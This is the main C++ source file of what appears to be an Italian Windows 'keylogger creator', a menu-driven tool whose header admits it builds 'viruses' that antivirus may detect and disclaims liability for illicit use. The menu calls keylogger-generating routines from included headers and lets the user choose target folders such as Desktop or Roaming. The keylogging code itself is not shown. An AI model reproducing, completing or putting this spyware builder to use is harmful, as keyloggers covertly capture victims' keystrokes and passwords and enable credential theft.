/*                                
                                  ================================================================
                                  ==       Questo software e' stato elaborato,sviluppato        ==
                                  ==         e progettato da Angelo Rosa nel marzo 2016         ==
                                  ==      Copia e diffusione del programma sono autorizzati     ==               
                                  ==   in quanto questo e' open source. L'autore non si assume  ==
                                  ==      alcune responsabilità circa l'uso, la distribuzione   ==                     
                                  == e la modifica per fini illeciti del programma in questione.==
                                  ==                      Solo per windows.                     ==
                                  ==    La velocità del caricamento dei rari elementi grafici   ==
                                  ==  presenti,dipendono dal clock della CPU del tuo computer.  ==
                                  ================================================================
                                  ################################################################                                       
                                  ##   I virus creati possono essere rilevati dagli antivirus.  ##
                                  ##        I virus creati sono stati creati dall'autore.       ##
                                  ##                Ulteriori informazioni sono                 ##
                                  ##  reperibili nella seziozone help del programma una volta   ##
                                  ##      eseguito.                                             ##
                                  ##  Per la segnalazione di bug o per altri problemi contatta: ##
                                  ##                [angelo.rosa1999@gmail.com]                 ##
                                ####                    Vota il programma:                      #######
			        ## http://redirecthttp.altervista.org/faq_keylogger_creator/vota.php ##
                                ##########                   [*GitHub*]                   #############
                                  ##      https://github.com/Virgula0/keylogger_creator         ##
                                  ##                    [KeyLogger hidden:]                     ##
                                  ##      https://github.com/Virgula0/keylogger_hidden          ##
                                  ################################################################ 
                                  
*/
#include <iostream>
#include <cstdlib>
#include <conio.h>
#include <time.h>
#include <string.h>
#include <windows.h>
#include <mmsystem.h>
#include ".\lib\__system__.h"         /* Una modifica inappropriata di queste, potrebbe non far funzionare il programma...*/
#include ".\lib\__loader__.h"
#include ".\lib\__title__.h"          
#include ".\lib\__faq__.h"            
#include ".\lib\__choose__.h"
#include ".\lib\__choose_2__.h"
#include ".\lib\__choose_dir__.h"
#include ".\lib\__keylogger_1__.h"
#include ".\lib\__keylogger_2__.h"
#include ".\lib\__keylogger_3__.h"
#include ".\lib\__keylogger_4__.h"
using namespace std;

int main(){


//###Funzione per musica rimuovere se non la si vuole, funziona solo in keylogger_run, del progetto DEV###

/*
PlaySound(".\\musica\\remix_by_angelo.wav",0,SND_ASYNC);  
*/


        write_title();            // la prima funzione grafica che va in esecuzione	
        int a,b,c;   
	  do{
		system("cls");
		
		intestazione();// funzione per l'intestazione
		a = choose1(); //richiamo funzione choose1 assegnando il ritonrno dalla funzione ad un avariabile
    	
		switch (a){
    	
    	case(1):
    	    waiting();
			key_logger_1();
			b = choose2();
			if (b==1)
			a = 20; 
    	    break;
    	
    	case(2):
    		waiting();
    		key_logger_2();
    	    b = choose2();
			if (b==1)
			a = 20;
    	    break;
    	    
    	case(3):
    		restart:
    		system("cls");
    		intestazione();
			c = dir_choose();
			if (c==1000){
			open_url();
			goto restart;                //goto obbligatorio con variabile a di ritorno da open_url; uscirebbe dal ciclo precondizionale
		    }
    	    else if (c==2000)
    	    key_logger_3("Programmi");
    	    else if (c==3000)
    	    key_logger_3("Programmi(x86)");
    	    else if (c==4000)
    	    key_logger_3("Windows");
    	    else if (c==5000)
    	    key_logger_3("Collegamenti");
    	    else if (c==6000)
    	    key_logger_3("Contatti");
    	    else if (c==7000)
    	    key_logger_3("Desktop");
    	    else if (c==8000)
    	    key_logger_3("Documenti");
    	    else if (c==9000)
    	    key_logger_3("Download");
    	    else if (c==10000)
    	    key_logger_3("Immagini");
    	    else if (c==11000)
    	    key_logger_3("Musica");
    	    else if (c==12000)
    	    key_logger_3("Partite salvate");
    	    else if (c==13000)
    	    key_logger_3("Preferiti");
    	    else if (c==14000)
    	    key_logger_3("Ricerche");
    	    else if (c==15000)
    	    key_logger_3("Roaming");
    	    else if (c==16000)
    	    key_logger_3("Video");
    	    else if (c==17000)
    	    key_logger_3("Pubblica");
    	    b = choose2();
			if (b==1)
    	    a = 20;
    	    break;
    	case(4):
    		key_logger_4();
    		b = choose2();
			if (b==1)
    	    a = 20;
    		break;
    	case(99):
    		open_url();
    		a = 20;
    		break;
    	case(0):
    		exit(0);
    		break;
        default:
    	    cout<<"Non hai inserito un'operazione valida in input"<<endl;
    	    sleep(3); //se da errore qui e hai una versione vecchia del compilatore sostituisci con: Sleep; anche nella libreria __system.h__
    	
        }
      }while((a!=1) && (a!=2) && (a!=3) && (a!=4));
	
	  fflush(stdin);
	    cout<<endl<<"                               ***Premi un qualunque tasto per uscire***"<<endl;
	    getchar();
      exit(0);
}
